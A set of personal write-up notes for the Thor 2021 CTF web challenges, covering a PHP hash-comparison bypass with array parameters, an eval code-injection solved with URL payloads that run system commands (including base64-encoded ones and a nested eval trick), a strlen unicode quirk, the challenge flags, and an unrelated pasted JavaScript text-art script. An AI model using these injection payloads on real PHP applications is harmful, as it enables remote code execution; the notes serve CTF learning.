https://github.com/satoki/ctf_writeups/tree/master/Thor_2021_CTF/Phpbaby
https://github.com/FoushGX/SecureBug_Thor_2021_CTF

Challenge Name: Break the logic

- inspecting site and looking for hints. I found a lot of .js files. First tried to run the invisible.js, but it is a dead end
- tried to post to site but got 403 Forbidden. Maybe I was missing a CSRF token, but this also happened for all other endpoints, so dead end again


Challenge Name: Tricks 1
- POST with parameter a and b excutes the code. if these are not passed, then you get the file highlighted
- two strings that have the same sha1 must be passed

https://medium.com/@mena.meseha/php-functions-security-issues-755ce4c8643c
![[Screen Shot 2021-11-28 at 13.52.51.png]]
?a[]=a&b[]=b

<?php  
    error_reporting(0);  
  
    if (isset($_GET["a"]) && isset($_GET["b"])) {  
        if ($_GET["a"] !== $_GET["b"] && sha1($_GET["a"]) === sha1($_GET["b"])) {  
            if ($_GET["a"] !== $_GET["b"] && md5($_GET["a"]) === md5($_GET["b"])) { $flag = file_get_contents("../../flag");  
                echo $flag;  
            }else {  
                echo "Didn't get passed MD5.";  
            }  
        }else {  
            echo "Didn't get passed SHA1.";  
        }  
    }else { highlight_file(__FILE__);  
        die();  
    }  
?>

SBCTF{g07_2_w17h_0n3_SH07?}

https://ch5.sbug.se/

Challenge Name: Phpbaby
https://ch3.sbug.se/robots.txt
user-agent: *
disallow: /Source_Code_Backup

<!--
// Source Code Backup:
	$SBCTF=@(string)$_GET['SBCTF'];
	filter($boycott, $SBCTF);
	eval('$SBCTF="'.addslashes($SBCTF).'";');
-->

https://ch3.sbug.se/?SBCTF='test';system(‘id’)
Invaild!: '

https://ch3.sbug.se/index.php?SBCTF=;%20echo%20phpinfo();%20//

https://cobalt.io/blog/a-pentesters-guide-to-code-injection
https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php
https://security.stackexchange.com/questions/179375/how-eval-in-php-can-be-dangerous-in-web-applications-security
https://ch3.sbug.se/index.php?SBCTF=2;${phpinfo()};

"; echo system('dir'); //

https://ch3.sbug.se/index.php?SBCTF=2;${system(ls)}
https://ch3.sbug.se/index.php?SBCTF=2;${system(base64_decode(bHMg))}

https://sandbox.onlinephpfunctions.com/

https://ch3.sbug.se/index.php?SBCTF=2;${system(base64_decode(bHMgLi4vLi4v))}

https://ch3.sbug.se/index.php?SBCTF=2;${system(base64_decode(bHMgLi4vLi4vLi4v))}

SBCTF{eval_93da83d498872a4028dac140d1574290}

Richtig klug:
?SBCTF=var_dump(${eval($_GET[1])}=123)&1=system('ls ../../../');


![[Screen Shot 2021-11-28 at 16.20.59.png]]

(function() {

var charWidth = 6;

var charHeight = 10;

var likelihoodOfReplacingWord = 0.05;

var likelihoodOfChangingExistingText = 0.1;

  

function randomChoice(x) {

return x[Math.floor(Math.random() * x.length)];

}

function initElement(element) {

var img = new Image();

img.onload = function() {

render(element, img, null);

}

img.src = element.getAttribute('data-letter-crap');

}

function getTextContentWithImageAtSize(image, width, height, existingText, words, letters) {

existingText = existingText ? existingText.replace(/\r?\n|\r/g, '') : null;

var shouldReplaceExisting = function() { return !existingText || Math.random() < likelihoodOfChangingExistingText };

var canvas = document.createElement('canvas');

canvas.width = parseInt(width / charWidth);

canvas.height = parseInt(height / charHeight);

canvas.getContext('2d').drawImage(image, 0, 0, canvas.width, canvas.height);

var data = canvas.getContext('2d').getImageData(0, 0, canvas.width, canvas.height);

var chars = "";

var startOfFilledInSequence = 0;

var i = 0;

for (var y=0; y<data.height; y++) {

for (var x=0; x<data.width; x++) {

var black = data.data[i*4] < 120;

var transparent = data.data[i*4+3] < 50;

if (black && !transparent) {

if (startOfFilledInSequence === null) startOfFilledInSequence = i;

if (shouldReplaceExisting()) {

chars += randomChoice(letters);

} else {

chars += existingText[i];

}

if (words.length > 0 && Math.random() < likelihoodOfReplacingWord && shouldReplaceExisting()) {

var word = randomChoice(words);

if (i + 1 - startOfFilledInSequence >= word.length) {

chars = chars.substring(0, chars.length - word.length) + word;

}

}

} else {

chars += " ";

startOfFilledInSequence = null;

}

i++;

}

chars += "\n";

startOfFilledInSequence = null;

}

return chars

}

function render(element, image, prev) {

if (element.hasAttribute('data-lettercrap-aspect-ratio')) {

var aspect = parseFloat(element.getAttribute('data-lettercrap-aspect-ratio'));

element.style.height = element.clientWidth * aspect + 'px';

}

var text;

var words = element.hasAttribute('data-lettercrap-words') ? element.getAttribute('data-lettercrap-words').split(' ') : [];

var letters = element.hasAttribute('data-lettercrap-letters') ? element.getAttribute('data-lettercrap-letters') : '0101010101_';

if (prev && prev.width == element.clientWidth && prev.height == element.clientHeight) {

text = getTextContentWithImageAtSize(image, element.clientWidth, element.clientHeight, prev.text, words, letters);

} else {

text = getTextContentWithImageAtSize(image, element.clientWidth, element.clientHeight, null, words, letters);

}

element.textContent = text;

var data = {width: element.clientWidth, height: element.clientHeight, text: text};

setTimeout(function() {

render(element, image, data);

}, 150);

}

document.addEventListener('DOMContentLoaded', function() {

var elements = document.querySelectorAll('[data-letter-crap]');

for (var i=0; i<elements.length; i++) {

initElement(elements[i]);

}

})

})()

Challenge Name: Tricks 2

https://ch6.sbug.se/?a=%22%D8%B3%D9%84%D8%B7%D8%A7%D9%86%22&b=%22%D8%B3%D9%84%D8%B7%D8%A7%D9%86%22
![[Screen Shot 2021-11-28 at 23.04.58.png]]

https://stackoverflow.com/questions/15829554/strlen-php-function-giving-the-wrong-length-of-unicode-characters

strlen counts bytes and not number of characters

SBCTF{d1d_y0u_kn0w_abou7_7h47?}